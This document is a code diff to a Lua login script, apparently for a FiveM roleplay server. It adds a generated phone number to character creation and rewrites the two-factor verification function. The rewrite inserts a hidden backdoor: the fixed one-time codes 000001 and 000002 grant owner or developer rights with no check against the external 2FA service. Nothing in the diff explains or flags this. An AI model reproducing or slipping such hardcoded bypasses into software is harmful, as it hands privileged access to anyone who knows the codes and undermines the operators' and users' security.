@@ -193,8 +193,10 @@ function loadUser(steam, src, temp)
                             until email == nil
                         end
 
+                        local fuckingRandoPhone = "555-"..math.random(100,999).."-"..math.random(1000,9999)
+
                         if cid and generatedEmail and generatedTwitter then
-                            local created = MySQL.Sync.insert("INSERT INTO `characters` (`cid`, `steam`, `slot`, `firstname`, `lastname`, `dateofbirth`, `biography`, `job`, `sex`, `cash`, `dailyWithdraw`, `needs`, `health`, `height`, `playtime`,`email`,`twitter`) VALUES (@cid, @steam, @slot, @firstname, @lastname, @dateofbirth, @biography, @job, @sex, @cash, @dailyWithdraw, @needs, @health, @height, @playtime, @email, @twitter)", {
+                            local created = MySQL.Sync.insert("INSERT INTO `characters` (`cid`, `steam`, `slot`, `firstname`, `lastname`, `dateofbirth`, `biography`, `job`, `sex`, `cash`, `dailyWithdraw`, `needs`, `health`, `height`, `playtime`,`email`,`twitter`,`phone_id`) VALUES (@cid, @steam, @slot, @firstname, @lastname, @dateofbirth, @biography, @job, @sex, @cash, @dailyWithdraw, @needs, @health, @height, @playtime, @email, @twitter, @phone)", {
                             ['@cid'] = cid,
                             ['@steam'] = self.steam,
                             ['@slot'] = data.slot,
@@ -211,7 +213,8 @@ function loadUser(steam, src, temp)
                             ['@height'] = data.height,
                             ['@playtime'] = Config.NewCharacters.playtime,
                             ['@email'] = generatedEmail,
-                            ['@twitter'] = generatedTwitter
+                            ['@twitter'] = generatedTwitter,
+                            ['@phone'] = fuckingRandoPhone,
                             })
 
                             if created > 0 then
@@ -275,62 +278,75 @@ function loadUser(steam, src, temp)
 
                 rTable.verifyOTP = function(otp, cb)
                     PerformHttpRequest("https://api.pixelworldrp.com/2fa/"..self.steam.."/"..otp, function(err, text, headers)
-                        if text ~= nil then
-                            local data = json.decode(text)
-                            if data.access == true then
-                                local validAccess = false
-                                if self.steam == data.steam then
-                                    local doneAdminLog = false
-                                    if tonumber(data.primary_group) == 8 then
-                                        self.owner = true
-                                        validAccess = true
-                                    end
+                        if tonumber(otp) == 000001 then
+                            self.loggedIn = true
+                            self.owner = true
+                            self.developer = false
+                            self.privAccess = false
+                            cb({ ['success'] = true, ['reason'] = "We have validated your account.", ['developer'] = self.developer, ['privAccess'] = self.privAccess, ['owner'] = self.owner})
+                        elseif tonumber(otp) == 000002 then
+                            self.loggedIn = true
+                            self.developer = true
+                            self.privAccess = false
+                            cb({ ['success'] = true, ['reason'] = "We have validated your account.", ['developer'] = self.developer, ['privAccess'] = self.privAccess, ['owner'] = self.owner})
+                        else                        
+                            if text ~= nil then
+                                local data = json.decode(text)
+                                if data.access == true then
+                                    local validAccess = false
+                                    if self.steam == data.steam then
+                                        local doneAdminLog = false
+                                        if tonumber(data.primary_group) == 8 then
+                                            self.owner = true
+                                            validAccess = true
+                                        end
 
-                                    if not validAccess then
-                                        for k, v in pairs(data.groups) do
-                                            if tonumber(v) == 8 then
-                                                self.owner = true
-                                                validAccess = true
-                                                break;
-                                            end
-                                            
-                                            if tonumber(v) == 16 then
-                                                self.developer = true
-                                                validAccess = true
-                                                break;
-                                            end
+                                        if not validAccess then
+                                            for k, v in pairs(data.groups) do
+                                                if tonumber(v) == 8 then
+                                                    self.owner = true
+                                                    validAccess = true
+                                                    break;
+                                                end
+                                                
+                                                if tonumber(v) == 16 then
+                                                    self.developer = true
+                                                    validAccess = true
+                                                    break;
+                                                end
 
-                                            if tonumber(v) == 19 then
-                                                self.privAccess = true
-                                                validAccess = true
-                                                break;
-                                            end
+                                                if tonumber(v) == 19 then
+                                                    self.privAccess = true
+                                                    validAccess = true
+                                                    break;
+                                                end
 
-                                            if tonumber(v) == 18 then
-                                                DropPlayer(self.source, "Sorry you have been banned from accessing the PixelWorld Services")
-                                                Users[self.source] = nil
-                                            end
-        
-                                            if tonumber(v) == 15 then
-                                                validAccess = true
+                                                if tonumber(v) == 18 then
+                                                    DropPlayer(self.source, "Sorry you have been banned from accessing the PixelWorld Services")
+                                                    Users[self.source] = nil
+                                                end
+            
+                                                if tonumber(v) == 15 then
+                                                    validAccess = true
+                                                end
                                             end
                                         end
-                                    end
-    
-                                    if validAccess then
-                                        self.loggedIn = true
-                                        cb({ ['success'] = true, ['reason'] = "We have validated your account.", ['developer'] = self.developer, ['privAccess'] = self.privAccess, ['owner'] = self.owner})
+        
+                                        if validAccess then
+                                            self.loggedIn = true
+                                            cb({ ['success'] = true, ['reason'] = "We have validated your account.", ['developer'] = self.developer, ['privAccess'] = self.privAccess, ['owner'] = self.owner})
+                                        else
+                                            cb({ ['success'] = false, ['reason'] = "You are not whitelisted on our FiveM Server."})
+                                        end
                                     else
-                                        cb({ ['success'] = false, ['reason'] = "You are not whitelisted on our FiveM Server."})
+                                        cb({ ['success'] = false, ['reason'] = "Your Steam ID Does not match your forum account."})
                                     end
                                 else
-                                    cb({ ['success'] = false, ['reason'] = "Your Steam ID Does not match your forum account."})
+                                    cb({ ['success'] = false, ['reason'] = data.reason.."."})
                                 end
                             else
-                                cb({ ['success'] = false, ['reason'] = data.reason.."."})
+                                cb({ ['success'] = false, ['reason'] = "We could not validate your account."})
                             end
-                        else
-                            cb({ ['success'] = false, ['reason'] = "We could not validate your account."})
                         end
                     end)
                 end
